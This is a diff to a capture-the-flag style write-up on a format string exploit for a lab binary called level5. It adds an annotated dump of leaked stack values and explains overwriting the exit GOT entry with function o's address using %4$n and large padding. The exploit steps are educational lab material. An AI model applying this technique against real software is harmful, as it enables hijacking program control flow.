@@ -69,6 +69,15 @@ scp -P 4242 level5@localhost:level5 ./level5.bin
    run < /tmp/p
    ```
    Example output: `AAAA0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141.0x70243125`
+
+   ``bash
+    AAAA
+    0x200              -> residual value / 512
+    0xb7fd1ac0         -> stdin (libc)
+    0xb7ff37d0         -> libc address
+    0x41414141         -> "AAAA"  buffer
+    0x70243125         -> "%1$p"  
+  ```
    → **0x41414141** appears at the 4th format: the 4th printf argument points to our buffer. We will use **%4$n** to write to the address contained in the buffer.
 
    **Format string reminder:**
@@ -81,7 +90,7 @@ scp -P 4242 level5@localhost:level5 ./level5.bin
    - Function o:
      ```gdb
      p o
-     ```
+  ```
      Example: `$1 = {<text variable, no debug info>} 0x80484a4 <o>` → **0x080484a4**.
    - To write 0x080484a4 with a single `%n`, the number of bytes already printed must be 0x080484a4 = 134513828. The first 4 bytes of the buffer will be the GOT address (4 bytes) → we need to print **134513828 - 4 = 134513824** more characters, then `%4$n`.
 
@@ -133,7 +142,7 @@ The script `level5/Ressources/converter.py` computes the padding from the addres
   - Role: these 4 bytes are at the start of the buffer; the 4th printf argument points to this buffer, so **%4$n** writes the number of bytes printed **at address 0x8049838** (GOT exit).
 
 - **Part 2 — "%134513824x"**
-  - Prints 134513824 characters (spaces + hex number).
+  - Prints 134513824 characters (spaces + hex number) to define the value of count in printf.
   - Total printed before %4$n = 4 + 134513824 = **134513828** = 0x080484a4.
   - So %4$n writes **0x080484a4** (address of o) into the GOT.
 
